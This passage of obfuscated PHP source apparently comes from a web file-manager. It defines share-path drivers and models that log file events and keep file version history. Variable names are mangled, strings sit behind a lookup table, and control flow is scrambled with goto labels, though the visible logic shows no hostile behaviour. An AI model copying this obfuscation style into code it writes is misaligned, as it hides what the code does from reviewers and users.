Cache::init()->remove($e³¦ÊŠÑ™ö); } } goto Bº½ù’çê…; fîÈî¾İˆ”: class PathDriverDbShareItem extends PathDriverDB { public function __construct($dŠëôÅ›ƒ) { $this->pathParse = $dŠëôÅ›ƒ; $this->model = Model($_SERVER[Šº][1192]); } public function getPathOuter($dä†ÅÍåô) { $EËÅ¯°–Ëé =& $_SERVER[Šº]; if (!$dä†ÅÍåô) { return $dä†ÅÍåô; } $dàÍ…ƒ×·ğ = $this->parse($dä†ÅÍåô); return trim(KodIO::makeShare($this->pathParse[$EËÅ¯°–Ëé[392]], $dàÍ…ƒ×·ğ[$EËÅ¯°–Ëé[392]]), $EËÅ¯°–Ëé[8]); } protected function infoParse($BÅµ„š£ó, $eÍÍØ»ŠÆ = false, $e‡½î‘™Ì˜ = false) { $dƒøà¦¥±× =& $_SERVER[Šº]; $AªâÛ«†¡ = $this->pathParse[$dƒøà¦¥±×[392]]; $C„Á—Ÿ¼Ïƒ = trim($this->pathParse[$dƒøà¦¥±×[1052]], $dƒøà¦¥±×[8]); return Action($dƒøà¦¥±×[1200])->sharePathInfo($AªâÛ«†¡, $C„Á—Ÿ¼Ïƒ); } public function infoFull($BÀ°Ï½«®) { $aØ¤°Ÿ„Ç =& $_SERVER[Šº]; $fÈ÷Ãßô† = explode($aØ¤°Ÿ„Ç[8], trim($BÀ°Ï½«®, $aØ¤°Ÿ„Ç[8])); if (count($fÈ÷Ãßô†) > 1) { $F¡‡ÓÏ±äÍ = implode($aØ¤°Ÿ„Ç[8], array_splice($fÈ÷Ãßô†, 1)); $c¦™„¸ëï™ = $this->model->pathInfoByPath($fÈ÷Ãßô†[0], $F¡‡ÓÏ±äÍ); if (!$c¦™„¸ëï™) { return !1; } $this->pathParse[$aØ¤°Ÿ„Ç[1052]] = $c¦™„¸ëï™[$aØ¤°Ÿ„Ç[403]]; } return $this->infoParse($BÀ°Ï½«®); } public function listAll($c±Çî¢Ù‘) { goto FùõŸé×Š²; A§öÈîƒÈï: foreach ($Aùªğéá™† as &$bÌ†‹‘ÀÅ) { check_abort(); $bÌ†‹‘ÀÅ[$AÁÖí˜÷Ë±[85]] = $f¹š¶ë‚¯->_shareItemeParse($bÌ†‹‘ÀÅ[$AÁÖí˜÷Ë±[85]], $e‹Ê†¼´”¼); } unset($bÌ†‹‘ÀÅ); return $Aùªğéá™†; goto eñô®ì¢»“; D¸¯¹‹ß¼: $Aùªğéá™† = $this->model->listAll($c±Çî¢Ù‘); $e‹Ê†¼´”¼ = Model($AÁÖí˜÷Ë±[571])->getInfo($E†ùßÁ³†á[$AÁÖí˜÷Ë±[475]]); $f¹š¶ë‚¯ = Action($AÁÖí˜÷Ë±[1200]); goto A§öÈîƒÈï; FùõŸé×Š²: $AÁÖí˜÷Ë± =& $_SERVER[Šº]; $E†ùßÁ³†á = IO::info($this->pathParse[$AÁÖí˜÷Ë±[76]]); if (!$E†ùßÁ³†á) { return array(); } goto D¸¯¹‹ß¼; eñô®ì¢»“: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b÷­­å­ôŠ) { $this->pathParse = $b÷­­å­ôŠ; $this->model = Model($_SERVER[Šº][1192]); } protected function infoParse($EôËÇğ‹Ÿ•, $f²¯ê¼êŸ = false, $c½‚àø˜° = false) { $a„Ù¿ˆ‚ =& $_SERVER[Šº]; return Action($a„Ù¿ˆ‚[1058])->sharePathInfo($this->pathParse[$a„Ù¿ˆ‚[76]], !0); } public function listPath($eÛ”öŸÄôÈ, $D‘£¢¾ì¥¤ = false) { $DõÃÀ±÷„Ğ =& $_SERVER[Šº]; $bÊÁÉ”›’ = parent::listPath($eÛ”öŸÄôÈ, $D‘£¢¾ì¥¤); foreach ($bÊÁÉ”›’ as $b¹œÄËŸ”‘ => $dÌœ·ç‡ó±) { if (!in_array($b¹œÄËŸ”‘, array($DõÃÀ±÷„Ğ[74], $DõÃÀ±÷„Ğ[75]))) { continue; } foreach ($dÌœ·ç‡ó± as $e Éé¥¿°· => $e´¹êğÓÜ) { $bÊÁÉ”›’[$b¹œÄËŸ”‘][$e Éé¥¿°·] = Action($DõÃÀ±÷„Ğ[1058])->shareItemInfo($e´¹êğÓÜ); } } return $bÊÁÉ”›’; } public function listAll($D‹ï÷·ÖÊ) { goto bí¬ÃÉ©‘¤; Dˆ½ğãİà½: return $F÷ÁöÚ©òî; goto F¾¼¿ŠÓ Ç; CâÅâ¸æ‡: $F÷ÁöÚ©òî = $this->model->listAll($D‹ï÷·ÖÊ); foreach ($F÷ÁöÚ©òî as &$BøİĞÉéí¶) { $BøİĞÉéí¶[$Aõ‰³†Ÿšğ[85]] = Action($Aõ‰³†Ÿšğ[1058])->shareItemInfo($BøİĞÉéí¶[$Aõ‰³†Ÿšğ[85]]); } unset($BøİĞÉéí¶); goto Dˆ½ğãİà½; bí¬ÃÉ©‘¤: $Aõ‰³†Ÿšğ =& $_SERVER[Šº]; $F°ß°»—µË = IO::info($this->pathParse[$Aõ‰³†Ÿšğ[76]]); if (!$F°ß°»—µË) { return array(); } goto CâÅâ¸æ‡; F¾¼¿ŠÓ Ç: } } class PathDriverDriverShareItem { public function __construct($dùÛìÖ‡™‡) { $this->pathParse = $dùÛìÖ‡™‡; } public function __call($EéÚ‘ùÖëƒ, $CœÍíôáõí) { $EØ„Ã©Øñù =& $_SERVER[Šº]; if (method_exists($this, $EéÚ‘ùÖëƒ)) { return; } $b‰Å¥±Éãº = call_user_func_array(array($EØ„Ã©Øñù[1201], $EéÚ‘ùÖëƒ), $CœÍíôáõí); $E‹ÂÌÔÁº­ = array($EØ„Ã©Øñù[1202], $EØ„Ã©Øñù[1203], $EØ„Ã©Øñù[1204], $EØ„Ã©Øñù[1205], $EØ„Ã©Øñù[526], $EØ„Ã©Øñù[528], $EØ„Ã©Øñù[1206], $EØ„Ã©Øñù[107], $EØ„Ã©Øñù[1207], $EØ„Ã©Øñù[1208]); if (in_array($EéÚ‘ùÖëƒ, $E‹ÂÌÔÁº­)) { $b‰Å¥±Éãº = $this->getPathOuter($b‰Å¥±Éãº); } return $b‰Å¥±Éãº; } public function copy($dõ¼»Ì¬Ì, $cèÑé£‹´, $e‘¿¢é’èÌ = false) { return $this->copyMove($dõ¼»Ì¬Ì, $cèÑé£‹´, $e‘¿¢é’èÌ, $_SERVER[Šº][526]); } public function move($bó”İÈ‰À, $BİİÇªÀÅœ, $CŠ˜‘­–í = false) { return $this->copyMove($bó”İÈ‰À, $BİİÇªÀÅœ, $CŠ˜‘­–í, $_SERVER[Šº][528]); } private function copyMove($aõ®‰æƒ´Ñ, $fã¹´Ì­¿ƒ, $cƒ›ğÑç¯, $D¥†›­ÁĞ) { goto CÅ®ÒÒï©ß; CÅ®ÒÒï©ß: $Aµ°×†…é¦ =& $_SERVER[Šº]; $F‡á¦•çÚ = $fã¹´Ì­¿ƒ; $C”¹ƒø£ = IO::driverMake($fã¹´Ì­¿ƒ); goto BŸï ÑÖ¾¬; d±³¤‘ààÑ: return $fî›Æš•†; goto eë’¬Ôåøô; BŸï ÑÖ¾¬: if ($C”¹ƒø£->pathParse[$Aµ°×†…é¦[1036]]) { $fã¹´Ì­¿ƒ = $C”¹ƒø£->pathParse[$Aµ°×†…é¦[1036]]; } else { $fã¹´Ì­¿ƒ = $F‡á¦•çÚ; } $fî›Æš•† = IO::copyMove($aõ®‰æƒ´Ñ, $fã¹´Ì­¿ƒ, $cƒ›ğÑç¯, $D¥†›­ÁĞ); $fî›Æš•† = $this->getPathOuter($fî›Æš•†); goto d±³¤‘ààÑ; eë’¬Ôåøô: } public function pathThis($AöšœŠŠä) { return get_path_this($this->pathParse[$_SERVER[Šº][76]]); } public function pathFather($C»©î«éÌ›) { return get_path_father($this->pathParse[$_SERVER[Šº][76]]); } public function iconvSystem($eÁºøŒ¬Œ’) { return $eÁºøŒ¬Œ’; } protected function infoParse($DŠ‡öãã“–, $dÃÙöµÂÈï = false) { $e‰£öâÛ×Ò =& $_SERVER[Šº]; $cçòŠöçîò = $this->pathParse[$e‰£öâÛ×Ò[473]][$e‰£öâÛ×Ò[1059]] . $this->pathParse[$e‰£öâÛ×Ò[1052]]; if ($dÃÙöµÂÈï) { $b¡İÁÕ¡ Ì = IO::infoWithChildren($cçòŠöçîò); } else { $b¡İÁÕ¡ Ì = IO::info($cçòŠöçîò); } $DŒª©½ÓÉ‹ = $this->pathParse[$e‰£öâÛ×Ò[473]]; return Action($e‰£öâÛ×Ò[1200])->_shareItemeParse($b¡İÁÕ¡ Ì, $DŒª©½ÓÉ‹); } public function listAll($Cšâõ•¸¼Ã) { $a”¸œÈ™š =& $_SERVER[Šº]; $FÃŠ‡ÁÅˆí = IO::listAll($Cšâõ•¸¼Ã); $Dù¥ºµŠ‡… = $this->pathParse[$a”¸œÈ™š[473]]; foreach ($FÃŠ‡ÁÅˆí as &$E‚’íË”¥‡) { check_abort(); $Föó†Ç²Å = IO::info($E‚’íË”¥‡[$a”¸œÈ™š[76]]); $Föó†Ç²Å = is_array($Föó†Ç²Å) ? $Föó†Ç²Å : array(); $E‚’íË”¥‡ = array_merge($Föó†Ç²Å, $E‚’íË”¥‡); $E‚’íË”¥‡[$a”¸œÈ™š[85]] = Action($a”¸œÈ™š[1200])->_shareItemeParse($E‚’íË”¥‡, $Dù¥ºµŠ‡…); } unset($E‚’íË”¥‡); return $FÃŠ‡ÁÅˆí; } public function getPathOuter($CÎ©øÈ®‚) { goto B‘ªéîâì; E×àÒ»»ï¨: if (substr($bØ’äêŞÄÇ, 0, strlen($AÀùçÌ”ìè)) != $AÀùçÌ”ìè) { return !1; } return $this->pathParse[$Cç„À‰ä¥Î[1053]] . $Cç„À‰ä¥Î[8] . ltrim($B£¡õ©ª¶, $Cç„À‰ä¥Î[8]); goto fÚ§ß‰¬ïÙ; B‘ªéîâì: $Cç„À‰ä¥Î =& $_SERVER[Šº]; $dâÍëØ•ˆ˜ = KodIO::parse($CÎ©øÈ®‚); if ($dâÍëØ•ˆ˜[$Cç„À‰ä¥Î[29]] == KodIO::KOD_SHARE_ITEM) { return $dâÍëØ•ˆ˜[$Cç„À‰ä¥Î[76]]; } goto CÒóø‡åô; CÒóø‡åô: $bØ’äêŞÄÇ = KodIO::clear($CÎ©øÈ®‚); $AÀùçÌ”ìè = KodIO::clear($this->pathParse[$Cç„À‰ä¥Î[473]][$Cç„À‰ä¥Î[1059]]); $B£¡õ©ª¶ = substr($bØ’äêŞÄÇ, strlen($AÀùçÌ”ìè)); goto E×àÒ»»ï¨; fÚ§ß‰¬ïÙ: } public function getType() { $F„­¥‘•‰ =& $_SERVER[Šº]; $A•ÊšöÏ¹µ = str_replace($F„­¥‘•‰[72], $F„­¥‘•‰[33], get_class($this)); return strtolower($A•ÊšöÏ¹µ); } public function isTypeObject($dğ“¸‹Ğ¶¯) { return IO::isTypeObject($dğ“¸‹Ğ¶¯); } public function info($aÙÄÀ·ÈÈÔ) { return $this->infoParse($aÙÄÀ·ÈÈÔ); } public function infoAuth($c·É¹œÁ¾­) { return $this->infoParse($c·É¹œÁ¾­); } public function infoWithChildren($BÔ‰’ÔÑ‹) { return $this->infoParse($BÔ‰’ÔÑ‹, !0); } public function infoFull($Aî…ßíäéÃ) { return $this->infoParse($Aî…ßíäéÃ); } } goto B“ÛŞÚÃ“; FÇŸÔãŸ‡ë: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\x63\x65\137\145\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\x61\164\145\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\x75\x6e\143\164\151\x6f\x6e"), array("\x64\145\163\x63", '', "\151\156\x73\x65\162\164\54\x75\160\144\141\x74\145\x2c\x73\145\x6c\145\143\164", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($C©–Ù‚¤æ¥, $bÍŠËªéæë, $B…ÈÇ¯–¶ = '') { goto C‡²ê—šœ; d¦˜‰”ÈÊ: $E“×‚†‰§Ù = array($b°î‘–³µ‡[417] => $C©–Ù‚¤æ¥, $b°î‘–³µ‡[1885] => $eôÆ§‚œ¬´[$b°î‘–³µ‡[485]], $b°î‘–³µ‡[1886] => $eôÆ§‚œ¬´[$b°î‘–³µ‡[28]], $b°î‘–³µ‡[502] => $eôÆ§‚œ¬´[$b°î‘–³µ‡[502]], $b°î‘–³µ‡[1506] => USER_ID, $b°î‘–³µ‡[422] => $bÍŠËªéæë, $b°î‘–³µ‡[1508] => $B…ÈÇ¯–¶); $this->addSystemLog($bÍŠËªéæë, $E“×‚†‰§Ù); unset($E“×‚†‰§Ù[$b°î‘–³µ‡[1886]], $E“×‚†‰§Ù[$b°î‘–³µ‡[502]]); goto eïÒ†å„ñ; eïÒ†å„ñ: return $this->add($E“×‚†‰§Ù); goto c•ÖœøÕëæ; A§ÛÌËÍÏ: if (!$eôÆ§‚œ¬´) { return !1; } if ($this->isCacheEvent($eôÆ§‚œ¬´, $bÍŠËªéæë)) { return; } if ($B…ÈÇ¯–¶ && is_string($B…ÈÇ¯–¶)) { $B…ÈÇ¯–¶ = array($b°î‘–³µ‡[1710] => $B…ÈÇ¯–¶); } goto d¦˜‰”ÈÊ; C‡²ê—šœ: $b°î‘–³µ‡ =& $_SERVER[Šº]; if (!$this->eventSave) { return; } $eôÆ§‚œ¬´ = Model($b°î‘–³µ‡[1192])->sourceInfo($C©–Ù‚¤æ¥); goto A§ÛÌËÍÏ; c•ÖœøÕëæ: } private function addSystemLog($aÅ˜·øñ’Á, $c“ô’Ïæ¨) { $dÓÖá¸«ö£ =& $_SERVER[Šº]; if ($aÅ˜·øñ’Á == $dÓÖá¸«ö£[1887]) { $aÅ˜·øñ’Á = $c“ô’Ïæ¨[$dÓÖá¸«ö£[438]][$dÓÖá¸«ö£[1888]]; } else { if (in_array($aÅ˜·øñ’Á, array($dÓÖá¸«ö£[1654], $dÓÖá¸«ö£[1889]))) { $aÅ˜·øñ’Á = $c“ô’Ïæ¨[$dÓÖá¸«ö£[438]][$dÓÖá¸«ö£[714]]; } } $FäŠÜ½—ÚĞ = array_merge($c“ô’Ïæ¨, array($dÓÖá¸«ö£[1890] => $c“ô’Ïæ¨[$dÓÖá¸«ö£[403]], $dÓÖá¸«ö£[1891] => $c“ô’Ïæ¨[$dÓÖá¸«ö£[1891]])); Model($dÓÖá¸«ö£[1618])->addLog($dÓÖá¸«ö£[1892] . $aÅ˜·øñ’Á, $FäŠÜ½—ÚĞ); } private function isCacheEvent($B£±·Ú³Š½, $dô¤‡‰ô·¸) { if ($B£±·Ú³Š½[$_SERVER[Šº][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($E…ˆï«ŸØ, $fŠ˜ÜŞÚè§) { $E‚¹°§ø»‘ =& $_SERVER[Šº]; $dà‘×™¶‘í = Model($E‚¹°§ø»‘[1192])->sourceInfo($E…ˆï«ŸØ); $BíÅ»—Ùê = array($E‚¹°§ø»‘[1888] => $fŠ˜ÜŞÚè§, $E‚¹°§ø»‘[28] => $dà‘×™¶‘í[$E‚¹°§ø»‘[28]]); return $this->addEvent($E…ˆï«ŸØ, $E‚¹°§ø»‘[1887], $BíÅ»—Ùê); } public function eventFileEdit($E¹İ Ğ¬³‰) { $aŞ»˜øÚàš =& $_SERVER[Šº]; $DÆÓ­‹¢®Ô = array($aŞ»˜øÚàš[1893] => $_SERVER[$aŞ»˜øÚàš[1894]], $aŞ»˜øÚàš[1895] => strtolower(ACTION)); return $this->addEvent($E¹İ Ğ¬³‰, $aŞ»˜øÚàš[1644], $DÆÓ­‹¢®Ô); } public function eventRecycle($f¤äÆ£Ù‰Û, $eçì…Èëª‰) { return $this->addEvent($f¤äÆ£Ù‰Û, $_SERVER[Šº][1889], $eçì…Èëª‰); } public function eventRemove($d­Ù¶¼ÜÄÒ) { $FÈš±•ö =& $_SERVER[Šº]; $AîÀ¸ê²¬¼ = Model($FÈš±•ö[1192])->sourceInfo($d­Ù¶¼ÜÄÒ); $f’Şà˜šÏé = $AîÀ¸ê²¬¼[$FÈš±•ö[28]]; return $this->addEvent($AîÀ¸ê²¬¼[$FÈš±•ö[485]], $FÈš±•ö[1643], $f’Şà˜šÏé); } public function eventShare($AÔËä®†„, $aÈ†³­Œ¿) { return $this->addEvent($AÔËä®†„, $_SERVER[Šº][1654], $aÈ†³­Œ¿); } public function eventMove($fİ‰Ì»µ³, $C¦•àõ‚œó, $eƒÁ³÷ÀÅ´) { goto f›ğàö„óî; EçÏ…á²…İ: $this->addEvent($fİ‰Ì»µ³, $eæ¼¨Â×áã[528], $DÂØâ¦Üƒ°); $eˆ„ƒ‡Óè = $B‘ì¿ä²Æß->sourceInfo($fİ‰Ì»µ³); $DÂØâ¦Üƒ° = array($eæ¼¨Â×áã[403] => $eˆ„ƒ‡Óè[$eæ¼¨Â×áã[403]], $eæ¼¨Â×áã[28] => $eˆ„ƒ‡Óè[$eæ¼¨Â×áã[28]]); goto bÍ²¯„÷Åƒ; f›ğàö„óî: $eæ¼¨Â×áã =& $_SERVER[Šº]; $B‘ì¿ä²Æß = Model($eæ¼¨Â×áã[1192]); $eˆ„ƒ‡Óè = $B‘ì¿ä²Æß->sourceInfo($fİ‰Ì»µ³); goto AÔ²ƒ‹µÈó; AÔ²ƒ‹µÈó: $e„İ°‰ÅÁõ = $B‘ì¿ä²Æß->sourceInfo($C¦•àõ‚œó); $CœÜÏùĞœ¹ = $B‘ì¿ä²Æß->sourceInfo($eƒÁ³÷ÀÅ´); $DÂØâ¦Üƒ° = array($eæ¼¨Â×áã[1043] => $C¦•àõ‚œó, $eæ¼¨Â×áã[1896] => $e„İ°‰ÅÁõ[$eæ¼¨Â×áã[28]], $eæ¼¨Â×áã[1876] => $e„İ°‰ÅÁõ[$eæ¼¨Â×áã[502]], $eæ¼¨Â×áã[1044] => $eƒÁ³÷ÀÅ´, $eæ¼¨Â×áã[1897] => $CœÜÏùĞœ¹[$eæ¼¨Â×áã[28]], $eæ¼¨Â×áã[1898] => $CœÜÏùĞœ¹[$eæ¼¨Â×áã[502]]); goto EçÏ…á²…İ; bÍ²¯„÷Åƒ: $this->addEvent($C¦•àõ‚œó, $eæ¼¨Â×áã[1899], $DÂØâ¦Üƒ°); goto B¦²²Œ»Ë; B¦²²Œ»Ë: } public function eventCopy($b¼š²•ÑĞµ) { $this->eventCreate($b¼š²•ÑĞµ, $_SERVER[Šº][526]); } public function eventRename($d•¼™µªÚ, $e¡÷ÀÊ î, $aº·ÃîË—¤) { $AòÌ•†‹Œ =& $_SERVER[Šº]; $EíËÏÉÀÎï = array($AòÌ•†‹Œ[1043] => $e¡÷ÀÊ î, $AòÌ•†‹Œ[1044] => $aº·ÃîË—¤); return $this->addEvent($d•¼™µªÚ, $AòÌ•†‹Œ[1206], $EíËÏÉÀÎï); } public function eventAddComment($d‘ÄõëÒŸ¬, $CÍß»Ğİ²‹) { return $this->addEvent($d‘ÄõëÒŸ¬, $_SERVER[Šº][1900], $CÍß»Ğİ²‹); } public function eventAddDesc($EàµÙàñŒÕ, $F¢³µ¥ÂÃÎ) { return $this->addEvent($EàµÙàñŒÕ, $_SERVER[Šº][1901], $F¢³µ¥ÂÃÎ); } public function listBySource($Bî­‰¸¸) { goto b¼Î³‰ØŒî; dÃ›Ï„Ò†: return $this->eventListParse($cäî¼ë¿, $Bî­‰¸¸); goto f¢­÷ğ¦; dÍä¬‘£ñà: if ($Aæ÷®Í˜[$BÊÀÓÏäœ[410]] == $BÊÀÓÏäœ[87]) { $dù»³—ëÃ = Model($BÊÀÓÏäœ[1192])->listSearchChildren($Bî­‰¸¸, 20000); $dù»³—ëÃ[] = $Bî­‰¸¸ . $BÊÀÓÏäœ[374]; $dá³·Œ¸»§ = array($BÊÀÓÏäœ[403] => array($BÊÀÓÏäœ[7], $dù»³—ëÃ)); } $cäî¼ë¿ = $this->where($dá³·Œ¸»§)->order($BÊÀÓÏäœ[1902])->selectPage(); if ($cäî¼ë¿[$BÊÀÓÏäœ[363]][$BÊÀÓÏäœ[364]] == 0) { $cäî¼ë¿[$BÊÀÓÏäœ[363]][$BÊÀÓÏäœ[364]] = 1; $cäî¼ë¿[$BÊÀÓÏäœ[366]] = array(array($BÊÀÓÏäœ[417] => $Bî­‰¸¸, $BÊÀÓÏäœ[1885] => $Aæ÷®Í˜[$BÊÀÓÏäœ[485]], $BÊÀÓÏäœ[1506] => $Aæ÷®Í˜[$BÊÀÓÏäœ[439]], $BÊÀÓÏäœ[422] => $BÊÀÓÏäœ[1903], $BÊÀÓÏäœ[423] => $Aæ÷®Í˜[$BÊÀÓÏäœ[193]], $BÊÀÓÏäœ[1508] => $BÊÀÓÏäœ[33])); } goto dÃ›Ï„Ò†; b¼Î³‰ØŒî: $BÊÀÓÏäœ =& $_SERVER[Šº]; $Aæ÷®Í˜ = Model($BÊÀÓÏäœ[1192])->sourceInfo($Bî­‰¸¸); $dá³·Œ¸»§ = array($BÊÀÓÏäœ[417] => $Bî­‰¸¸); goto dÍä¬‘£ñà; f¢­÷ğ¦: } private function eventListParse($E¨µ¶¬Ú, $dàãàŒÎ–¾) { goto DÕçÈ Æƒ; BÒ½³£ù: $E¨µ¶¬Ú[$ešÑ®ã¸ª»[366]] = $E×Óİ¯’; return $E¨µ¶¬Ú; goto CğÎÍÉ¡; Eï¯†„Í‡ê: $fÜòÍôæµ = array_unique($fÜòÍôæµ); $Cùˆ—ß¼‚º = array_unique(array_to_keyvalue($E×Óİ¯’, $ešÑ®ã¸ª»[33], $ešÑ®ã¸ª»[1514])); $D©†¨¹Œ¿ = Model($ešÑ®ã¸ª»[514])->userListInfo($Cùˆ—ß¼‚º); goto D¸÷Í²; DÕçÈ Æƒ: $ešÑ®ã¸ª» =& $_SERVER[Šº]; $E×Óİ¯’ = $E¨µ¶¬Ú[$ešÑ®ã¸ª»[366]]; $fÜòÍôæµ = array_to_keyvalue($E×Óİ¯’, $ešÑ®ã¸ª»[33], $ešÑ®ã¸ª»[403]); goto D™ğ×ã™íƒ; D™ğ×ã™íƒ: $dÕºˆ­ Œß = array_to_keyvalue($E×Óİ¯’, $ešÑ®ã¸ª»[33], $ešÑ®ã¸ª»[1891]); foreach ($E×Óİ¯’ as $F‡îŸÈº†æ) { $c¹‹ê¡äï = $F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]]; if ($F‡îŸÈº†æ[$ešÑ®ã¸ª»[29]] == $ešÑ®ã¸ª»[528] && isset($c¹‹ê¡äï[$ešÑ®ã¸ª»[1043]])) { $fÜòÍôæµ[] = $c¹‹ê¡äï[$ešÑ®ã¸ª»[1043]] . $ešÑ®ã¸ª»[33]; $fÜòÍôæµ[] = $c¹‹ê¡äï[$ešÑ®ã¸ª»[1044]] . $ešÑ®ã¸ª»[33]; } if ($F‡îŸÈº†æ[$ešÑ®ã¸ª»[29]] == $ešÑ®ã¸ª»[1899] && isset($c¹‹ê¡äï[$ešÑ®ã¸ª»[403]])) { $fÜòÍôæµ[] = $c¹‹ê¡äï[$ešÑ®ã¸ª»[403]] . $ešÑ®ã¸ª»[33]; } } $fÜòÍôæµ = array_merge($fÜòÍôæµ, $dÕºˆ­ Œß, array($dàãàŒÎ–¾ . $ešÑ®ã¸ª»[33])); goto Eï¯†„Í‡ê; D¸÷Í²: $Cº÷«ëÍÁà = Model($ešÑ®ã¸ª»[788])->sourceListInfo($fÜòÍôæµ, !0); foreach ($E×Óİ¯’ as &$F‡îŸÈº†æ) { if ($F‡îŸÈº†æ[$ešÑ®ã¸ª»[29]] == $ešÑ®ã¸ª»[528] && isset($F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[1043]])) { $F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[1043]] = $Cº÷«ëÍÁà[$F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[1043]]]; $F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[1044]] = $Cº÷«ëÍÁà[$F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[1044]]]; } if ($F‡îŸÈº†æ[$ešÑ®ã¸ª»[29]] == $ešÑ®ã¸ª»[1899] && isset($F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[403]])) { $F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[403]] = $Cº÷«ëÍÁà[$F‡îŸÈº†æ[$ešÑ®ã¸ª»[438]][$ešÑ®ã¸ª»[403]]]; } $F‡îŸÈº†æ[$ešÑ®ã¸ª»[85]] = $Cº÷«ëÍÁà[$F‡îŸÈº†æ[$ešÑ®ã¸ª»[403]]]; $F‡îŸÈº†æ[$ešÑ®ã¸ª»[1904]] = $Cº÷«ëÍÁà[$F‡îŸÈº†æ[$ešÑ®ã¸ª»[1891]]]; if ($F‡îŸÈº†æ[$ešÑ®ã¸ª»[29]] == $ešÑ®ã¸ª»[1643]) { $F‡îŸÈº†æ[$ešÑ®ã¸ª»[1904]] = $F‡îŸÈº†æ[$ešÑ®ã¸ª»[85]]; $F‡îŸÈº†æ[$ešÑ®ã¸ª»[1891]] = $F‡îŸÈº†æ[$ešÑ®ã¸ª»[1904]][$ešÑ®ã¸ª»[403]]; $F‡îŸÈº†æ[$ešÑ®ã¸ª»[85]] = !1; $F‡îŸÈº†æ[$ešÑ®ã¸ª»[403]] = $ešÑ®ã¸ª»[33]; } $F‡îŸÈº†æ[$ešÑ®ã¸ª»[1834]] = $D©†¨¹Œ¿[$F‡îŸÈº†æ[$ešÑ®ã¸ª»[1514]]]; } unset($F‡îŸÈº†æ); goto BÒ½³£ù; CğÎÍÉ¡: } public function removeBySource($dĞÅà°Îš) { $DºÇ²½Ûš = array($_SERVER[Šº][417] => $dĞÅà°Îš); $this->where($DºÇ²½Ûš)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\143\145\137\x68\x69\163\164\157\162\x79"; public function historyCount($F§ÜÏò¸’Æ) { goto dê¸Œ„¾ğ¹; F‹òÆ¢–›: return array_to_keyvalue($CÅ×öâî¿Ï, $cæóšÄ±ìñ[403], $cæóšÄ±ìñ[487]); goto f¥Ï¸Ïá; DŠõ½ò¢: $dì©§¿ÆŒ = array($cæóšÄ±ìñ[403], $cæóšÄ±ìñ[1709] => $cæóšÄ±ìñ[487]); $FÁªËÛØê¹ = array($cæóšÄ±ìñ[403] => array($cæóšÄ±ìñ[7], $F§ÜÏò¸’Æ)); $CÅ×öâî¿Ï = $this->field($dì©§¿ÆŒ)->where($FÁªËÛØê¹)->group($cæóšÄ±ìñ[403])->select(); goto F‹òÆ¢–›; dê¸Œ„¾ğ¹: $cæóšÄ±ìñ =& $_SERVER[Šº]; if (!$F§ÜÏò¸’Æ) { return array(); } if (is_string($F§ÜÏò¸’Æ) || is_int($F§ÜÏò¸’Æ)) { $F§ÜÏò¸’Æ = array($F§ÜÏò¸’Æ); } goto DŠõ½ò¢; f¥Ï¸Ïá: } public function addHistory($A©ÃÜÕ®¼Ï, $a´ÙÍ³±¶ = '') { $C´ôæèõ®ğ =& $_SERVER[Šº]; $a…¢•ĞÉ = array($C´ôæèõ®ğ[417] => $A©ÃÜÕ®¼Ï[$C´ôæèõ®ğ[403]], $C´ôæèõ®ğ[1506] => isset($A©ÃÜÕ®¼Ï[$C´ôæèõ®ğ[441]]) ? $A©ÃÜÕ®¼Ï[$C´ôæèõ®ğ[441]] : $A©ÃÜÕ®¼Ï[$C´ôæèõ®ğ[439]], $C´ôæèõ®ğ[455] => $A©ÃÜÕ®¼Ï[$C´ôæèõ®ğ[454]], $C´ôæèõ®ğ[556] => $A©ÃÜÕ®¼Ï[$C´ôæèõ®ğ[78]], $C´ôæèõ®ğ[1905] => $a´ÙÍ³±¶); $e¥Ä’…èŠÜ = $GLOBALS[$C´ôæèõ®ğ[6]][$C´ôæèõ®ğ[88]][$C´ôæèõ®ğ[1092]]; if ($e¥Ä’…èŠÜ > 1) { $this->historyAutoClear($a…¢•ĞÉ[$C´ôæèõ®ğ[403]]); $this->add($a…¢•ĞÉ); } Hook::trigger($C´ôæèõ®ğ[1906], $a…¢•ĞÉ); Model($C´ôæèõ®ğ[1907])->eventFileEdit($A©ÃÜÕ®¼Ï[$C´ôæèõ®ğ[403]]); } private function historyAutoClear($AôÊ£ê‰¨) { goto a§Ğ¯àáóÕ; f´…†ÄÄÊ¦: $C°É¶¯­åà = array_slice($C°É¶¯­åà, $B±‹Òåñ›Ö); if (!$EğÇêçØñó || !$C°É¶¯­åà) { return; } $eÃÜ„Û¤‹è = array($DßÃáˆ…¥[419] => array($DßÃáˆ…¥[7], $EğÇêçØñó)); goto d„’¹®ÀÓˆ; dãôßÁ¡í¨: $EğÇêçØñó = array_to_keyvalue($dÍïÛŞ¸¥², $DßÃáˆ…¥[33], $DßÃáˆ…¥[392]); $EğÇêçØñó = array_slice($EğÇêçØñó, $B±‹Òåñ›Ö); $C°É¶¯­åà = array_to_keyvalue($dÍïÛŞ¸¥², $DßÃáˆ…¥[33], $DßÃáˆ…¥[454]); goto f´…†ÄÄÊ¦; AŒ¹®–ª†: $B±‹Òåñ›Ö = $f®¤ ˜†Æ° == $DßÃáˆ…¥[1114] ? 5 : $aÍÇ…“°Ñ; if ($aÍÇ…“°Ñ <= 1) { $B±‹Òåñ›Ö = 1; } if ($B±‹Òåñ›Ö >= 500) { return; } goto BœÊ†‚ÄÑ; d„’¹®ÀÓˆ: $this->where($eÃÜ„Û¤‹è)->delete(); 